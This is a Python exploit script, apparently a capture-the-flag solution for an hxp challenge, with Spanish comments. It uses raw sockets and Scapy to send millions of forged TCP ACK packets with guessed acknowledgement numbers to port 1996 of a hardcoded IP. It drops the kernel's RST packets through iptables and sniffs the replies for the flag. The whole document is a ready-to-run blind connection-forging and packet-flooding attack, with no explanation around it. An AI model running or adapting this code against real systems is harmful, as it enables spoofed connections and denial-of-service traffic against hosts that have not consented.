#!/usr/bin/env python3
import atexit
import os
import random
import re
import socket
import struct
import subprocess
import sys
import time

from scapy.all import IP, TCP, Raw, AsyncSniffer, conf, get_if_addr, send


PORT = 1996


def run_cmd(argv: list[str], timeout_s: int = 2) -> None:
    subprocess.run(argv, check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=timeout_s)


def sum16_words(data: bytes) -> int:
    if len(data) & 1:
        data += b"\x00"
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) + data[i + 1]
    return s


def fold16(s: int) -> int:
    s = (s & 0xFFFF) + (s >> 16)
    s = (s & 0xFFFF) + (s >> 16)
    return s & 0xFFFF


def main() -> int:
    if os.geteuid() != 0:
        print("ejecuta con sudo/root", file=sys.stderr)
        return 2

    dst = sys.argv[1] if len(sys.argv) > 1 else "46.224.125.47"
    conf.verb = 0

    # Scapy en Debian/Ubuntu suele devolver: (iface, output_ip, gateway)
    route = conf.route.route(dst)
    iface = route[0]
    src = route[1] if len(route) >= 2 else None
    if not src or src == "0.0.0.0":
        src = get_if_addr(iface)

    sport = random.randint(1024, 65535)
    our_seq = random.randint(0, 0xFFFFFFFF)

    # Evitar que el kernel mate la conexión con RST (no hay socket real).
    run_cmd(["iptables", "-I", "OUTPUT", "-p", "tcp", "-d", dst, "--dport", str(PORT), "--tcp-flags", "RST", "RST", "-j", "DROP"], 2)
    atexit.register(
        lambda: run_cmd(
            ["iptables", "-D", "OUTPUT", "-p", "tcp", "-d", dst, "--dport", str(PORT), "--tcp-flags", "RST", "RST", "-j", "DROP"],
            2,
        )
    )

    found = {"flag": None, "buf": bytearray()}

    def on_pkt(p) -> None:
        if Raw not in p:
            return
        payload = bytes(p[Raw].load)
        found["buf"] += payload
        m = re.search(rb"hxp\{[^}]+\}", found["buf"])
        if m:
            found["flag"] = m.group(0)

        # ACK para ayudar a que el servidor cierre limpio (no es estrictamente necesario).
        ackn = p[TCP].seq + len(payload) + (1 if (p[TCP].flags & 0x01) else 0)
        send(IP(src=src, dst=dst) / TCP(sport=sport, dport=PORT, flags="A", seq=our_seq, ack=ackn), iface=iface, verbose=False)

    sniffer = AsyncSniffer(
        iface=iface,
        store=False,
        lfilter=lambda p: IP in p
        and TCP in p
        and p[IP].src == dst
        and p[TCP].sport == PORT
        and p[TCP].dport == sport,
        prn=on_pkt,
    )
    sniffer.start()

    rs = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    rs.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    # Precomputar IP header (ID fijo para evitar recomputar checksum).
    ip_id = random.randint(0, 0xFFFF)
    ver_ihl = 0x45
    tos = 0
    total_len = 20 + 20
    flags_frag = 0
    ttl = 64
    proto = 6
    saddr = socket.inet_aton(src)
    daddr = socket.inet_aton(dst)
    ip_hdr0 = struct.pack("!BBHHHBBH4s4s", ver_ihl, tos, total_len, ip_id & 0xFFFF, flags_frag, ttl, proto, 0, saddr, daddr)
    ip_chk = (~fold16(sum16_words(ip_hdr0))) & 0xFFFF
    ip_hdr = struct.pack("!BBHHHBBH4s4s", ver_ihl, tos, total_len, ip_id & 0xFFFF, flags_frag, ttl, proto, ip_chk, saddr, daddr)

    # Precomputar suma base para checksum TCP (ACK variable).
    data_offset = 5
    flags = 0x10  # ACK
    window = 64240
    urg_ptr = 0
    tcp_hdr_ack0_chk0 = struct.pack(
        "!HHLLBBHHH",
        sport,
        PORT,
        our_seq & 0xFFFFFFFF,
        0,  # ack=0 (se suma incrementalmente)
        data_offset << 4,
        flags,
        window,
        0,  # checksum=0
        urg_ptr,
    )
    pseudo = struct.pack("!4s4sBBH", saddr, daddr, 0, proto, len(tcp_hdr_ack0_chk0))
    tcp_base_sum = sum16_words(pseudo + tcp_hdr_ack0_chk0)
    start = time.time()
    tries = 0
    # Esperanza ~2^24 intentos (≈16M). Ejecutar más tiempo aumenta la probabilidad linealmente.
    max_seconds = float(os.environ.get("MAX_SECONDS", "240"))
    x = random.getrandbits(32) or 0xA5A5A5A5
    while time.time() - start < max_seconds and found["flag"] is None:
        # xorshift32 (más rápido que random.getrandbits en bucle apretado)
        x ^= (x << 13) & 0xFFFFFFFF
        x ^= (x >> 17) & 0xFFFFFFFF
        x ^= (x << 5) & 0xFFFFFFFF
        ack = x & 0xFFFFFFFF
        s = tcp_base_sum + ((ack >> 16) & 0xFFFF) + (ack & 0xFFFF)
        tcp_chk = (~fold16(s)) & 0xFFFF
        tcp_hdr = struct.pack(
            "!HHLLBBHHH",
            sport,
            PORT,
            our_seq & 0xFFFFFFFF,
            ack & 0xFFFFFFFF,
            data_offset << 4,
            flags,
            window,
            tcp_chk,
            urg_ptr,
        )
        pkt = ip_hdr + tcp_hdr
        try:
            rs.sendto(pkt, (dst, 0))
        except OSError:
            pass
        tries += 1
        # Ceder CPU muy de vez en cuando.
        if (tries & 0xFFFFF) == 0:
            time.sleep(0)

    sniffer.stop()

    if found["flag"]:
        sys.stdout.buffer.write(found["flag"] + b"\n")
        return 0
    if os.environ.get("PRINT_STATS") == "1":
        dur = max(0.000001, time.time() - start)
        print(f"tries={tries} rate={tries/dur:.0f}/s", file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())

